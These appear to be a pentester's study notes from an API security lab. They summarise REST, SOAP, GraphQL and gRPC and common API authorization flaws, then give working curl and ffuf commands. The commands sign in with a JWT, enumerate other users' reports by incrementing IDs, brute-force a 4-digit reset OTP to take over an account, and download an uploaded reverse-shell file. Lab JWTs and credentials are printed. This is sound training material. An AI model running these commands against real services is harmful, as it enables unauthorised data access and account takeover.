---
title: http api
aliases:
tags:
---

# http api

## notes
- types
    - Representational State Transfer (REST) is the most popular API style. It uses a client-server model where clients make requests to resources on a server using standard HTTP methods (GET, POST, PUT, DELETE). RESTful APIs are stateless, meaning each request contains all necessary information for the server to process it, and responses are typically serialized as JSON or XML.
    - Simple Object Access Protocol (SOAP) uses XML for message exchange between systems. SOAP APIs are highly standardized and offer comprehensive features for security, transactions, and error handling, but they are generally more complex to implement and use than RESTful APIs.
    - GraphQL is an alternative style that provides a more flexible and efficient way to fetch and update data. Instead of returning a fixed set of fields for each resource, GraphQL allows clients to specify exactly what data they need, reducing over-fetching and under-fetching of data. GraphQL APIs use a single endpoint and a strongly-typed query language to retrieve data.
    - gRPC is a newer style that uses Protocol Buffers for message serialization, providing a high-performance, efficient way to communicate between systems. gRPC APIs can be developed in a variety of programming languages and are particularly useful for microservices and distributed systems.
- Broken Object Level Authorization
    - its authorization checks (implemented at the source-code level) fail to correctly ensure that an authenticated user has sufficient permissions or privileges to request and view specific data or perform certain operations
- Broken Object Property Level Authorization is a category of vulnerabilities that encompasses two subclasses: 
    - Excessive Data Exposure
        - it reveals sensitive data to authorized users that they are not supposed to access
    - Mass Assignment
        - it permits authorized users to manipulate sensitive object properties beyond their authorized scope, including modifying, adding, or deleting values. Think being able to change the discount percentage for a particular user or merchant.
- Unrestricted Resource Consumption
    - resources such as network bandwidth, CPU, memory, and storage
    - can we upload a 10 mb pdf or exe file? Can we then access it? `curl -O http://94.237.51.179:51135/SupplierCompaniesCertificatesOfIncorporations/reverse-shell.exe`

## attack
- authenticating with JWT and swagger
    - `curl -X 'POST' 'http://'$rhost'/api/v1/authentication/suppliers/sign-in' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{"Email": "htbpentester2@pentestercompany.com", "Password": "HTBPentester2" }'`
        - returns `{"jwt":"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjFAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJTdXBwbGllckNvbXBhbmllc19HZXRZZWFybHlSZXBvcnRCeUlEIiwiZXhwIjoxNzI1NzY2MjkwLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.IE0XsfhPH3MU4Cgo8SHOSJFSnXuf8zzqhPMd4xl722NLICdJZx3S5zK9Y7PWS4w1ZNBLQZ_YZ-tzcPZ0LthOVg"}`
    - can now be used for subsequent api calls
        - `curl -X 'GET' 'http://'$rhost'/api/v1/roles/current-user' -H 'accept: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjFAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJTdXBwbGllckNvbXBhbmllc19HZXRZZWFybHlSZXBvcnRCeUlEIiwiZXhwIjoxNzI1NzY2MjkwLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.IE0XsfhPH3MU4Cgo8SHOSJFSnXuf8zzqhPMd4xl722NLICdJZx3S5zK9Y7PWS4w1ZNBLQZ_YZ-tzcPZ0LthOVg'`
- Broken Object Level Authorization
    - check for auto incrementing ids
        - ```
        for ((i=1; i<= 20; i++)); do
        curl -s -w "\n" -X 'GET' 'http://'$rhost'/api/v1/supplier-companies/yearly-reports/'$i'' -H 'accept: application/json' -H 'Authorization: Bearer  eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTcyNTc3MTQzMiwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.aH_Pap_9lSAO1E9BPm05qX0Q9ChiA23T4p5UPFzz2di4D5I1h87g36m9j4KWiJtJaWkXvCWFsO7nVl1tjE_3vw' -v | jq
        done
        ```
- Broken Authentication
    - can we list all users?
    - what is the password policy?
    - can we brute force using ffuf?
    - if we cant brute force passwords due to password policies can we
        - brute force one time passwords? 4 or 6 numbers?
            - request otp `curl -X 'POST' 'http://$rhost/api/v1/authentication/customers/passwords/resets/sms-otps' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{"Email": "MasonJenkins@ymail.com"}';`
            - brute force using ffuf `ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt:PASS -u http://94.237.49.212:57900/api/v1/authentication/customers/passwords/resets -X POST -H "Content-Type: application/json" -d '{"Email": "MasonJenkins@ymail.com", "OTP": "PASS", "NewPassword":"Gravytrain123"}' -fr /true/i -t 1000`
        - security questions and answers
- Broken Object Property Level Authorization
    - Excessive Data Exposure if it reveals sensitive data to authorized users that they are not supposed to access
    - 



